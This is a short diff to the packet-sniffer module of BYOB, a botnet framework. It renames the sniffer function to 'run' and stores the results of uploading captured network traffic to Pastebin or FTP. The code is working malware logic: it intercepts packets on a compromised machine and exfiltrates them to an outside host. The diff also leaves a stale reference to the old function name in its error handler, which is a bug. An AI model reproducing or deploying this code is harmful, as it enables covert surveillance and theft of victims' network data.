@@ -5,14 +5,22 @@ https://github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
 """
 from __future__ import print_function
+
+# standard libarary
+import os
+import sys
+import time
 import struct
 import socket
 import binascii
 import cStringIO
 
+# byob
+import util
+
 
 _buffer = []
-
+results = {}
 
 def _udp_header(data):
     try:
@@ -131,7 +139,7 @@ def _eth_header(data):
 
 
 @util.threaded
-def packetsniffer(mode, seconds=30):
+def run(mode, seconds=30):
     try:
         if mode not in ('pastebin','ftp'):
             return "Error: invalid upload mode '%s'" % str(mode)
@@ -151,8 +159,7 @@ def packetsniffer(mode, seconds=30):
         try:
             sniffer_socket.close()
         except: pass
-        try:
-            output = cStringIO.StringIO('\n'.join(_buffer))
-            result = util.pastebin(output) if 'ftp' not in mode else util.ftp(output, filetype='.pcap')
+        output = cStringIO.StringIO('\n'.join(_buffer))
+        results[time.ctime()] = util.pastebin(output) if 'ftp' not in mode else util.ftp(output, filetype='.pcap')
     except Exception as e:
         util.debug("{} error: {}".format(packetsniffer.func_name, str(e)))
